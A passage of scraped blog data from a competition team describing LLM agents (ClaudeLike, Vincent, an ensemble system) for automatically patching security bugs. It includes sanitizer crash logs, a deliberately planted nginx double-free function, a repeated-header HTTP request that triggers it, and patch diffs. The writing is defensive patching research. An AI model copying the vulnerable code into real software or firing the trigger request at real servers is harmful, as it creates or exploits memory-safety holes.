at java.base/java.util.AbstractSet.hashCode(AbstractSet.java:124) Caused by: java.lang.StackOverflowError at java.base/java.util.HashMap$KeyIterator.\u0026lt;init\u0026gt;(HashMap.java:1605) at java.base/java.util.HashMap$KeySet.iterator(HashMap.java:985) at java.base/java.util.HashSet.iterator(HashSet.java:174) at java.base/java.util.AbstractSet.hashCode(AbstractSet.java:120) at java.base/java.util.AbstractSet.hashCode(AbstractSet.java:124) (... many lines of repeating ...) at java.base/java.util.AbstractSet.hashCode(AbstractSet.java:124) ... 1 more DEDUP_TOKEN: e94a000057f77cf1 == libFuzzer crashing input == In the case of timeout errors, it was common for every function in the crash log\u0026rsquo;s stack trace to belong either to the standard Java runtime (JDK) or the Jazzer driver itself, leaving no trace of the project\u0026rsquo;s code where the issue originated. For stack overflow errors, the situation was similarly problematic: stack traces often displayed a long recursive chain of internal JDK functions, while the most critical portion — the project function that triggered the overflow — was truncated or omitted entirely. In both cases, the patch agent had no reliable entry point for debugging, making it virtually impossible to localize the fault using crash logs alone.\nTo overcome this limitation, we introduced a runtime stack tracing mechanism. Our system periodically captured the stack trace of the JVM\u0026rsquo;s main thread every second during the bug reproduction. When a crash finally occurred, the agent used the last recorded stack trace as a more informative snapshot of the program\u0026rsquo;s execution state. This supplementary trace provided a meaningful starting point for fault localization and enabled the agent to generate plausible patches even for these otherwise opaque bug types.\nConclusion Martian Agent demonstrates a practical approach to AI-assisted patch generation by combining structured context management, modular tool usage, and iterative reasoning. By separating fault localization and patch generation, and using ReAct-based workflows, the agent can analyze crash reports, explore codebases, and generate patches in a systematic way. Its additional strategies for handling stack overflow and timeout errors show how supplementing standard crash logs with runtime traces can make fault localization more reliable. Overall, Martian Agent provides a useful example of how AI agents can assist in automated debugging and patch generation without overcomplicating the process.\n"},{"section":"Blog","slug":"/blog/post-crs-patch-agent-claudelike/","title":"ClaudeLike: How to Apply a Tool-Based Agent to Patch Generation","description":"Overview of ClaudeLike&#39;s development background and key features","date":"October 10, 2025","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/crs-patch/integration_hu_4cc29e32d87aa579.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"204\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/crs-patch\\/integration_hu_eb65a98b6ff66970.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/crs-patch/integration_hu_e258cce7671211cb.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/crs-patch\\/integration_hu_bd0fd2d0dfb4c66e.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Atlantis-Patch","tags":"patch, AI agent","content":"Claude Code is an LLM agent specialized in general-purpose programming tasks and remains one of the most powerful LLM agents to date. Inspired by Claude Code\u0026rsquo;s strategy, we developed ClaudeLike, an agent dedicated to patch generation. In this post, we introduce the motivation and key features behind the development of ClaudeLike.\nMotivation: Applying a SOTA LLM Agent to Patch Generation Why Did We Need to Develop a New Agent? When Claude Code was released, we experimented to see whether it could generate patches effectively, as we had previously done with tools like Aider and SWE-Agent. We found that Claude Code performed reasonably well when provided with contextual information such as crash logs. However, we determined that directly integrating Claude Code into Crete would be difficult.\nThe main reason is that Claude Code\u0026rsquo;s internals cannot be modified, which would limit our ability to add or customize tools in the future. Additionally, some of Claude Code\u0026rsquo;s built-in tools—such as Bash or WebFetchTool—were unnecessary for our use case and could lead to unpredictable behavior.\nCore Strategy Instead of integrating Claude Code directly into Crete, we decided to build a new agent that adopts its core strategies. Through an in-depth analysis of Claude Code, we found that two design aspects have a significant impact on its performance:\nA well-designed file editor tools that enables efficient analysis and modification of project structures and files. The use of a sub-agent to perform smaller, multi-step tasks, thereby reducing the context burden on the main agent. With these two strategies as the foundation, we developed ClaudeLike.\nImplementation: File Editor Tools and AgentTool ClaudeLike generates patches through the following three steps:\nIt constructs a prompt from the PoC and SARIF report, then passes it to the ClaudeLike coder. The ClaudeLike coder locates and fixes the buggy code within the project, producing a patch diff. The agent evaluates whether the generated patch diff is sound. If not, it provides feedback to the coder to regenerate a new patch. The overall structure is similar to that of other simple patch-generating agents. The coder plays the role analogous to Claude Code, and its structure is as follows:\nFig.1 High-level overview of Martian Agent\nThe ClaudeLike coder\u0026rsquo;s main agent is composed of file editor tools and an AgentTool. The main agent interacts with the project by invoking file editor tools and can also spawn a sub-agent to perform specific tasks.\nFile Editor Tools: Enabling Agent–Project Interaction ClaudeLike analyzes and modifies projects using six file editor tools inspired by Claude Code:\nEditTool(file_path, old_string, new_string): Replaces the old_string from the file in file_path into new_string. The old_string must exist in the file and be uniquely matched in the file. GlobTool(pattern, path): Returns the list of files in the path directory whose filenames match the glob pattern. GrepTool(pattern, path, include): Returns the list of files in the path directory whose content match the given regex expression pattern. The result only includes files whose filenames match the glob pattern include. LSTool(path): Returns the list of files in the path directory. ReplaceTool(file_path, content): Replaces the content of file file_path into given content. If the file file_path does not exist, ReplaceTool creates it and sets the content of the file as content. ViewTool(file_path, offset, limit): Returns the maximum limit lines of the file file_path starts from line number offset Each tool\u0026rsquo;s description explicitly defines when it should be used, its constraints, and the valid argument types. By referencing these descriptions, the agent can select and use the appropriate tools to accomplish its tasks effectively.\nAgentTool: Helping the Agent Stay Focused In the libxml2 project from Round 3, a double-free vulnerability was discovered. The following is a portion of the ASAN crash log output when this vulnerability is triggered:\n==ERROR: AddressSanitizer: attempting double-free on 0x5020000008b0 in thread T0: SCARINESS: 42 (double-free) #0 0x563555fc1f66 in free /src/llvm-project/compiler-rt/lib/asan/asan_malloc_linux.cpp:52:3 #1 0x5635560b54b4 in xmlParseAttribute2 /src/libxml2/parser.c:9028:13 #2 0x5635560ad714 in xmlParseStartTag2 /src/libxml2/parser.c:9233:13 #3 0x56355607b6d0 in xmlParseElementStart /src/libxml2/parser.c:10136:16 #4 0x56355607a997 in xmlParseElement /src/libxml2/parser.c:10071:9 #5 0x5635560864f1 in xmlParseDocument /src/libxml2/parser.c:10902:2 #6 0x56355609bb88 in xmlCtxtParseDocument /src/libxml2/parser.c:13988:5 #7 0x56355609f024 in xmlCtxtReadMemory /src/libxml2/parser.c:14314:12 #8 0x563556001bd4 in LLVMFuzzerTestOneInput /src/libxml2/fuzz/xml.c:68:15 #9 0x563555eb6430 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:614:13 #10 0x563555ea16a5 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:327:6 #11 0x563555ea713f in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:862:9 #12 0x563555ed23e2 in main /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerMain.cpp:20:10 #13 0x7fec0f842082 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x24082) (BuildId: 5792732f783158c66fb4f3756458ca24e46e827d) #14 0x563555e9988d in _start (/out/xml+0x18388d) DEDUP_TOKEN: __interceptor_free--xmlParseAttribute2--xmlParseStartTag2 0x5020000008b0 is located 0 bytes inside of 9-byte region [0x5020000008b0,0x5020000008b9) freed by thread T0 here: #0 0x563555fc1f66 in free /src/llvm-project/compiler-rt/lib/asan/asan_malloc_linux.cpp:52:3 #1 0x5635560b541f in xmlParseAttribute2 /src/libxml2/parser.c:9024:17 #2 0x5635560ad714 in xmlParseStartTag2 /src/libxml2/parser.c:9233:13 ... To patch this vulnerability, the agent must first identify its root cause. For this purpose, the agent examines the point where the double free occurs—specifically, the implementation of the xmlParseAttribute2 function in libxml2/parser.c.\nBenchmark results show that the process of locating and reviewing this function\u0026rsquo;s implementation involves a series of file editor tool calls as follows. (The xmlParseAttribute2 function is implemented between line 8823 and line 8927 in parser.c.)\nUse GlobTool to search for the file matching the pattern **/parser.c to locate its exact path. Use ViewTool to read 100 lines starting from line 9000 of parser.c. Use GrepTool to check whether the string xmlParseAttribute2 exists in parser.c. Use ViewTool again to view 100 lines from line 8800. Use ViewTool once more to view 200 lines starting from line 8900. As seen above, even to inspect the contents of a single suspected function, the agent needs to make five separate file editor tool calls. If the target function is not located where expected or spans more lines than anticipated, the number of tool calls required will increase. In fact, the Apache Commons Compress project in the Round 2, identifying the file containing a specific method required 23 file editor tool calls in total.\nTasks such as examining function implementations or reviewing files are essential for patch generation and may occur multiple times during the patch process. However, each tool call adds to the agent\u0026rsquo;s context length. As a result, the agent may lose focus on its primary task—patch generation. Furthermore, since the agent retains the parameters and results of all previous tool calls in its context, a large number of tool invocations significantly increases the number of input tokens per completion. This, in turn, leads to frequent issues such as rate limit exceedances or context window size exceedances.\nTo address this, ClaudeLike adopts AgentTool, similar to Claude Code. The main agent can invoke the AgentTool to delegate specific tasks to a sub-agent. Sub-agent operates independently of the main agent, makes its own tool calls, and returns results to the main agent. This design allows the main agent to offload repetitive or verbose tasks (e.g., identifying file functionality or searching for files), thus keeping its context concise and focused on generating patches.\nTo prevent uncontrolled recursion, a sub-agent is not allowed to use AgentTool itself. Additionally, to avoid unintended code modifications, a sub-agent is restricted from using EditTool and ReplaceTool.\nEnsuring Robustness under Unstable LLM Server Conditions Tool calls are executed through model invocations. In other words, if a model invocation fails, the corresponding tool call cannot be made, which in turn results in the failure of the entire agent system.\nThroughout the Rounds, we observed that both the LiteLLM server and Claude API were not always stable. Since not only the patch system but also other components of the overall Atlantis system send LLM requests, issues such as limited TPM or system overload occasionally prevented LLM model invocations from completing successfully.\nTo address these issues, ClaudeLike repeatedly performs model invocations until they succeed. Furthermore, to prevent its LLM requests from causing congestion across the entire system, ClaudeLike implements exponential backoff as a form of congestion control.\nDifferences from Claude Code While the core idea of ClaudeLike originates from Claude Code, there are several key differences between the two.\nThe most significant distinction lies in the tool configuration. ClaudeLike excludes tools that are unrelated to patch generation or may cause side effects—for instance, tools designed for Jupyter notebooks such as ReadNotebook and NotebookEditCell, tools that require an online environment such as WebFetchTool, and command-execution tools like Bash.\nIn addition, as mentioned in the previous section, ClaudeLike carefully handles exceptions that may occur during API calls or tool invocations to prevent system-wide failures. Furthermore, to reduce common mistakes made by the agent during patch generation, we added a set of explicit instructions to the system prompt.\nLimitations ClaudeLike demonstrated quite strong performance in the benchmarks conducted during its development. However, there are several areas where further improvement is needed.\nOur initial goal in developing ClaudeLike was to explore how applying custom tools (e.g., gdb interface), expected to be effective for patching, on a SOTA agent like Claude Code, would impact performance. Due to limited development and stabilization time, this goal could not be fully realized.\nAnother limitation is that certain tools from Claude Code, which were anticipated to be useful for patch generation—such as Bash and BatchTool—were excluded. Bash was omitted from ClaudeLike due to potential side effects, although with proper sandboxing, it could have been quite valuable. BatchTool, which allows multiple tools in Claude Code to be executed simultaneously, was also deprioritized and ultimately not incorporated into ClaudeLike. Its inclusion could have helped reduce context length and improve the efficiency of tool calls.\nConclusion In this post, we discussed ClaudeLike, an agent inspired by Claude Code\u0026rsquo;s design principles. Evaluation results show that ClaudeLike successfully generates sound patches for most cases in the Round 3 dataset. Furthermore, through repeated benchmarking, we observed that performance varied significantly depending on the clarity and specificity of tool descriptions and whether AgentTool was enabled.\nThese findings suggest that strategies used in general-purpose software engineering agents can also be effectively applied to security patch generation. In particular, providing well-defined tools with precise instructions and enabling the agent to maintain focus by reducing context size are proven to be effective strategies for tool-based agents performing patch generation.\n"},{"section":"Blog","slug":"/blog/post-crs-patch-agent-vincent/","title":"Vincent, One Puzzle for Our Ensemble Toward High-quality Patches","description":"Overview of the Vicent agent, one of patching agents in Atlantis-Patch.","date":"October 10, 2025","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/crs-patch/integration_hu_4cc29e32d87aa579.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"204\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/crs-patch\\/integration_hu_eb65a98b6ff66970.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/crs-patch/integration_hu_e258cce7671211cb.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/crs-patch\\/integration_hu_bd0fd2d0dfb4c66e.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Atlantis-Patch","tags":"patch, ensemble, multi-agent","content":"As mentioned in the previous post, our strategy for patching is to prepare multiple agents to ensure both the robustness and correctness of the system. To this end, we developed various patch agents, each specialized for different LLM models and tools.\nIn this post, we would like to introduce Vincent agent, one of the patch agents running under our ensemble-based patching system.\nRight Root cause, Wrong Patches What surprised us during the competition was that LLMs alone are already quite doing well at generating proper patches. Given a sanitizer report, LLMs could freely explore the codebase by itself and reason correctly about the given bug—especially when the problematic code appeared near the call stacks in the report.\nHowever, our patch agent consistently struggled with the following (seemingly) simple challenge. The challenge is a double-free bug in the nginx provided by the AIxCC organizer, where the bug is placed in the ngx_http_process_prefer in the ngx_http_request.c. (If interested, the actual challenge can be found in here).\nstatic ngx_int_t ngx_http_process_prefer(ngx_http_request_t *r, ngx_table_elt_t *h, ngx_uint_t offset) { ngx_table_elt_t *p; if (r-\u0026gt;headers_in.prefer) { ngx_log_error(NGX_LOG_INFO, r-\u0026gt;connection-\u0026gt;log, 0, \u0026#34;client sent duplicate host header: \\\u0026#34;%V: %V\\\u0026#34;, \u0026#34; \u0026#34;previous value: \\\u0026#34;%V: %V\\\u0026#34;\u0026#34;, \u0026amp;h-\u0026gt;key, \u0026amp;h-\u0026gt;value, \u0026amp;r-\u0026gt;headers_in.prefer-\u0026gt;key, \u0026amp;r-\u0026gt;headers_in.prefer-\u0026gt;value); ngx_free(r-\u0026gt;headers_in.prefer); // double-free return NGX_OK; } p = ngx_alloc(sizeof(ngx_table_elt_t), r-\u0026gt;connection-\u0026gt;log); if (!p) { ngx_http_finalize_request(r, NGX_HTTP_BAD_REQUEST); return NGX_ERROR; } p-\u0026gt;hash = h-\u0026gt;hash; p-\u0026gt;key.len = h-\u0026gt;key.len; p-\u0026gt;key.data = h-\u0026gt;key.data; p-\u0026gt;value.len = h-\u0026gt;value.len; p-\u0026gt;value.data = h-\u0026gt;value.data; r-\u0026gt;headers_in.prefer = p; return NGX_OK; } ngx_http_process_prefer is a function that handles Prefer headers in the given HTTP request. It first checks if any prefer header already exists. If so, the function decides that the current request is invalid. It logs the current request and free the previously allocated object. Otherwise, it allocates the ngx_table_elt_t and store the provided prefer header information.\nGET / HTTP/1.1 Host: localhost Prefer: FirstPrefer Prefer: SecPrefer Prefer: ThirdPrefer Accept: */* Here\u0026rsquo;s how the situation goes wrong. If a HTTP request maliciously contains multiple prefer headers, it can make the program enter the if-block multiple times. However, the function never nullifies r-\u0026gt;headers_in.prefer after freeing the object. Consequently, the dangling pointer r-\u0026gt;headers_in.prefer can be reused, which is a typical use-after-free scenario.\nThe sanitizer report for the given problematic input seems to exhibit \u0026ldquo;all-we-have-to-know\u0026rdquo; about this bug.\n==14==ERROR: AddressSanitizer: attempting double-free on 0x506000006d40 in thread T0: SCARINESS: 42 (double-free) #0 0x5630699d7106 in free /src/llvm-project/compiler-rt/lib/asan/asan_malloc_linux.cpp:52:3 #1 0x563069acd9cd in ngx_http_process_prefer /src/nginx/src/http/ngx_http_request.c:4018:9 #2 0x563069adc761 in ngx_http_process_request_headers /src/nginx/src/http/ngx_http_request.c:1499:23 [...omitted...] DEDUP_TOKEN: __interceptor_free--ngx_http_process_prefer--ngx_http_process_request_headers 0x506000006d40 is located 0 bytes inside of 56-byte region [0x506000006d40,0x506000006d78) freed by thread T0 here: #0 0x5630699d7106 in free /src/llvm-project/compiler-rt/lib/asan/asan_malloc_linux.cpp:52:3 #1 0x563069acd9cd in ngx_http_process_prefer /src/nginx/src/http/ngx_http_request.c:4018:9 #2 0x563069adc761 in ngx_http_process_request_headers /src/nginx/src/http/ngx_http_request.c:1499:23 [...omitted...] The report clearly indicates that the bug is a double-free in the ngx_http_process_prefer function.\nSo far, the bug is quite obvious and it looks easy to fix considering the current LLMs\u0026rsquo; capabilities. How can we fix this bug? A straightforward fix would be to nullify the pointer r-\u0026gt;headers_in.prefer after ngx_free. By doing so, we would prevent the function from entering the problematic if-block repeatedly — and that was the exact way how LLMs thought.\n--- a/src/http/ngx_http_request.c +++ b/src/http/ngx_http_request.c @@ -4016,6 +4016,7 @@ \u0026amp;h-\u0026gt;key, \u0026amp;h-\u0026gt;value, \u0026amp;r-\u0026gt;headers_in.prefer-\u0026gt;key, \u0026amp;r-\u0026gt;headers_in.prefer-\u0026gt;value); ngx_free(r-\u0026gt;headers_in.prefer); + r-\u0026gt;headers_in.prefer = NULL; // Nullify to prevent further misuse (comment by LLMs) return NGX_OK; } Here\u0026rsquo;s the typical patch that our patch agents produced. As mentioned earlier, it nullifies the r-\u0026gt;headers_in.prefer pointer to prevent further misuse.\nHowever, it turned out that the problem was not that simple. When handling each HTTP request, nginx requires \u0026ldquo;rules\u0026rdquo; to treat the failures. To be specific, for problematic HTTP requests, each header handlers (like ngx_http_process_prefer) must finalize the HTTP request using ngx_http_finalize_request with a proper flag, and return the NGX_ERROR to indicate something went wrong with the request. Without complying the rules, the patched program still suffers from another heap overflow caused by prefer header.\nThis implies that the agent must also consider project-specifc aspects rather than just fixing the observed symptom.\nGuiding LLMs Toward the Right Way: Property-Analysis Layer The question is, how can we guide the LLMs to consider such \u0026ldquo;project-specific\u0026rdquo; aspect without losing generality? To address this issue, our team borrowed the concept of properties from the field of software engineering and verification.\nA program property is, usually described in a formal logical representation, is a statement about a program’s behavior that should hold true for all possible executions (or specific ones).\nFor example, here are properties in popular projects:\nSafety Property: \u0026ldquo;No null pointer dereference occurs during kernel execution.\u0026rdquo; (Linux Kernel) Functional Property: \u0026ldquo;After executing an INSERT statement, the database file contains the inserted row.\u0026rdquo; (SQLite) Our team\u0026rsquo;s strategy is to use this concept of properties to avoid context-agnostic patches that only addresses symptoms of security issues. To this end, Vincent agent added an intermediate layer that analyzes the program property just before generating patches. Interestingly, LLMs seems to already have the concept of properties, enabling the use of concise prompt like below.\n[...omitted...] In formal terms, a property refers to a condition that must hold true across all possible execution traces (i.e., sequences of system states). This means that every possible path the program can take during execution must satisfy the property. [...omitted...] By using the property extraction prompt, Vincent agent infers the properties related to the given bug. The following example is a partial list of program properties for the provided double-free bug when using Claude Sonnet 3.5 model.\nMemory Safety: For any header field in ngx_http_headers_in_t, the pointer must either be NULL or point to a valid ngx_table_elt_t structure. Header Processing Consistency: All single-value HTTP headers (like Host, From, Content-Length) must maintain exactly one instance throughout the request processing lifecycle. Error Response Consistency: When encountering invalid headers, the system must either: (1) Return NGX_ERROR and call ngx_http_finalize_request with NGX_HTTP_BAD_REQUEST (2) Log the issue and return NGX_OK But never both or neither. The Error Response Consistency is one that LLMs failed to consider in the previous superficial patch.\nBy considering this property, Vincent agent managed to produce the following sound patch for the given nginx double-free bug:\n--- a/src/http/ngx_http_request.c +++ b/src/http/ngx_http_request.c ngx_free(r-\u0026gt;headers_in.prefer); - return NGX_OK; + r-\u0026gt;headers_in.prefer = NULL; + ngx_http_finalize_request(r, NGX_HTTP_BAD_REQUEST); + return NGX_ERROR; } Workflow of Vincent Agent The overall workflow of Vincent Agent consists of three analysis steps as follows.\nFig.1 High-level overview of Vincent Agent\nThe initial step is the root cause analysis (RCA) step—a process that identifies the reason why the bug occurs. Given the sanitizer report and the PoC (Proof-of-Concept) input binary, Vincent lets the LLMs explore the codebase autonomously. The next step is property analysis. Using the RCA report from the previous step, Vincent extracts relevant program properties with the help of the LLMs. To infer more precise properties, the LLMs are allowed to further explore the codebase. Finally, with the RCA and property analysis reports retained in the message context, Vincent instructs the LLMs to generate a security patch in diff format.\nFor each generated patch, Vincent applies it to the given project and validates whether the patch is sound. To do this, Vincent utilizes the OSS-Fuzz–based building and testing interfaces of Crete, our framework for developing patch agents.\nAs a result of patch validation, there are four possible outcomes: (i) sound, (ii) vulnerable, (iii) uncompilable, and (iv) test failure. Except in the case of a sound patch, Vincent collects the related logs (e.g., sanitizer report, build error log, etc.) and delivers the information to the LLM to generate a new patch. Vincent repeats the patch generation–validation-feedback cycle until a sound patch is produced.\nCode Retrieval of Vincent Agent One of the core components that each patch agent should support is the code retrieval feature, which enables the LLMs to understand the codebase. Based on our experience in internal evaluations, the precision of code retrieval and the performance of LLMs are highly correlated. In Crete, we adopt various code retrieval strategies to ensure the robustness and responsiveness of our system. In the case of Vincent Agent, we provide the LLMs with code information by combining the ctags utility and the tree-sitter library.\nctags is a command-line utility that generates an index (or \u0026ldquo;tags\u0026rdquo; file) of symbols found in source code files—like functions, classes, variables, macros, etc. tree-sitter is a modern parsing library designed to build incremental parsers for programming languages, primarily to provide fast, precise, and robust syntax analysis for code editors and tools.\nInstead of providing entire source files, Vincent Agent pinpoints code snippets essential to the LLM\u0026rsquo;s request. Specifically, given a target symbol name, such as a function or variable, Vincent first locates where the requested code snippet exists using ctags. Then, it extracts the actual code, including the surrounding context (e.g., the full implementation of a function, struct, enum, etc.), using tree-sitter.\nBeyond this basic strategy, we observed occasional failures of tree-sitter\u0026rsquo;s parser when dealing with complex codebases. For example, if the target source code contains complex compile directives or macros, tree-sitter may fail to parse the intended snippets properly. To handle such potential errors from external libraries, Vincent allows LLMs to request additional code lines when the initial query result is insufficient.\nConclusion In this blog post, we discussed one of the challenges our team struggled with and how the Vincent agent successfully solved it. While LLMs can often fix surface-level bugs, they struggle with project-specific rules and invariants. By introducing a property analysis layer, Vincent guides LLMs to reason about deeper program semantics, resulting in sounder patches. Integrated within the Crete framework, Vincent autonomously retrieves, analyzes, and validates patches in an iterative loop, improving both correctness and robustness.\n"},{"section":"Blog","slug":"/blog/post-crs-patch-integration/","title":"Ensembles of Agents for Robust and Effective Automated Patching","description":"Overview of Atlantis-Patching","date":"October 5, 2025","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/crs-patch/integration_hu_4cc29e32d87aa579.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"204\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/crs-patch\\/integration_hu_eb65a98b6ff66970.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/crs-patch/integration_hu_e258cce7671211cb.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/crs-patch\\/integration_hu_bd0fd2d0dfb4c66e.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Atlantis-Patch","tags":"patch, ensemble, multi-agent","content":"Why Ensemble for Patching? In the AIxCC competition, finding vulnerabilities is only half the battle. Once a vulnerability is discovered, it must be patched to prevent exploitation. This is where the Atlantis-Patching system comes into play. As the AIxCC\u0026rsquo;s ultimate mission is to make software secure, it awards more points for patching vulnerabilities than for finding them. In particular, the competition rewards 6 points for patching a vulnerability, compared to just 2 points for discovering it. As a result, to win the competition, it is crucial to have a robust and efficient patching system that can quickly generate effective patches for discovered vulnerabilities.\nEarly Challenges with a Single Agent In the early stages of development, we attempted to create a single all-encompassing agent that could handle all types of vulnerabilities. However, this approach proved to be impractical due to the diverse nature of vulnerabilities and the unpredictable behavior of LLMs. As AIxCC involves a wide variety of bugs and projects, we found that it is nearly impossible to create a one-size-fits-all solution to effectively address all scenarios. Our agent becomes too complex and brittle as we try to cover more cases, leading to maintenance difficulties and performance degradation. We could make one agent that works well for one type of vulnerability, but it often failed to generalize to others.\nOur Solution: Ensemble of Specialized Agents To address this, we adopted an ensemble approach, where multiple specialized agents work together to tackle the patching task. Each agent is designed to focus on a specific type of vulnerability or employ a particular patching strategy. This modular approach allows us to develop and maintain each agent independently, making it easier to adapt and improve them over time.\nEnsembling can be effective in patching thanks to its partial verifiability. Even though we cannot fully verify a patch\u0026rsquo;s correctness, we can check its plausibility; that is, whether it compiles, passes tests, and successfully patches the vulnerability that it aims to fix. This property helps generate patches with consistent quality and allows direct evaluation of their validity. This is particularly helpful in patching, where we cannot use techniques like majority voting to combine outputs from multiple agents, as they can produce syntactically different yet semantically equivalent patches.\nOne of the biggest advantages of this strategy is fault tolerance. If one agent behaves unexpectedly, it doesn’t bring down the entire system. Since the competition does not allow any intervention after submission, this design helps to ensure that we can still generate patches even if one agent fails.\nSystem Architecture: Main–Sub Structure for Parallel Ensemble Execution For ensemble patching, we built a distributed architecture that coordinates multiple agents to work on the same vulnerability simultaneously. The architecture consists of a Main Node and four Sub Nodes, as illustrated below:\n┌────────┐ │ Main │ └───┬────┘ ┌───────────────────+─────────────────────┐ ▼ ▼ ▼ ┌────────────┐ ┌────────────┐ ┌────────────┐ │ Sub Node 1 │ │ Sub Node 2 │ │ ... │ └──────┬─────┘ └─────┬──────┘ └────────────┘ ▼ ▼ Agent 1 → Agent 2 Agent 1 → Agent 2 The Main Node serves as the central controller of the system. When PoV is received, it distributes the task in parallel to multiple Sub Nodes, each operating as an independent execution unit that runs several agents simultaneously. Once a patch is returned, the Main Node validates it to ensure that it complies with policy requirements and that the vulnerability can no longer be triggered.\nEach Sub Node, in contrast, processes its assigned vulnerability sequentially. It runs multiple agents one after another, with each agent attempting to generate a valid patch using different algorithms or heuristics. As soon as any agent successfully produces a working patch, that patch is immediately adopted, and the Sub Node stops further execution for that specific vulnerability.\nHow to Choose and Order Agents for Each Sub Node? In the AIxCC final round, we built an ensemble of ten instances using eight agents — two open-source and six internally developed ones. Among these agents, we use two instances of multi_retrieval (based on claude 3.7 and o4-mini) and two instances of aider (based on gemini 2.5 pro and gpt-4o). The full configuration details can be found in configs.json.\nIt is also important to decide how to order agents within each Sub Node. Through our empirical testing, we order them based on three creteria:\nLLM resource: We placed agents that use LLMs from the same provider (e.g., Anthropic) in the same Sub Node to minimize the risk of hitting rate limits or throughput constraints. In particular, we experienced that with Anthropic models, running several agents simultaneously can easily hit TPM limits, leading to delays or failures. By being aware of these limits, the system avoids overloading the model and maintains stable throughput.\nHigh-Performance Agents First: We also attempted to place agents that have historically performed well in our internal benchmark. In the AIxCC final round, we can get a higher score if we can generate a valid patch quickly. So, it is reasonable to prioritize agents that are more likely to produce a valid patch early in the sequence. Moreover, one of the biggest risks is producing plausible but incorrect patches. During our internal testing, we observed that some agents occasionally produced incorrect patches even though they are classified as plausible. Thus, we placed agents that are less likely to produce such patches earlier to minimize these risks.\nExecution time: We arranged agents based on their expected execution time, placing fast agents with slow ones to balance the overall execution time of each Sub Node. This helps to minimize the total time taken for patching, making the system more efficient.\nDeduplicate PoVs and Patches In patching, we need two types of deduplication: PoV deduplication and patch deduplication. First of all, we need to deduplicate PoVs for efficient resource usage. If we process the same PoV multiple times, it wastes computational resources and time that could be better spent on unique vulnerabilities. Even though AIxCC organizers attempt to filter out duplicate PoVs, we still observed many duplicates. This is understandable as PoV deduplication is inherently challenging. For that, we implemented a simple patch-based deduplication mechanism. When a PoV is received, we check if previously submitted patches have already 